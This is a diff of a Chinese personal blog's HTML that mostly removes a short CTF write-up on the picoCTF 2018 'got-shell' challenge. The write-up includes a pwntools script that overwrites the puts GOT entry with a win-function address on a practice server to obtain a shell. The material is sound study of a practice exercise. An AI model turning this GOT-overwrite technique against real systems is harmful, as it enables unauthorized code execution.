-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="网络幻影">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/20/picoctf-2018-got-shell-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">picoctf_2018_got_shell(逻辑漏洞)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-03-20 15:49:42" itemprop="dateCreated datePublished" datetime="2025-03-20T15:49:42+08:00">2025-03-20</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-09-23 20:45:46" itemprop="dateModified" datetime="2025-09-23T20:45:46+08:00">2025-09-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/stack/" itemprop="url" rel="index"><span itemprop="name">stack</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>pwn的题一般是栈溢出，格式化漏洞，堆利用，逻辑漏洞</p>
-<p>其中据我了解堆利用比栈的难度高很多，逻辑漏洞更是灵活。</p>
-<p>这次恰好碰到一个逻辑漏洞记录一下。</p>
-<p><img src="/2025/03/20/picoctf-2018-got-shell-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p>
-<p>所以可以直接写exp了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=remote(&#x27;node5.buuoj.cn&#x27;,25642)</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./PicoCTF_2018_got-shell&#x27;)</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">win_addr=0x0804854B</span><br><span class="line"></span><br><span class="line">r.sendlineafter(b&quot;I&#x27;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;, hex(puts_got))</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(hex(win_addr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 
       
@@ -1895,7 +1907,7 @@
     <img class="site-author-image" itemprop="image" alt="linkpwn"
       src="/images/avatar.jpg">
   <p class="site-author-name" itemprop="name">linkpwn</p>
-  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+  <div class="site-description" itemprop="description">linkpwn的学习记录</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
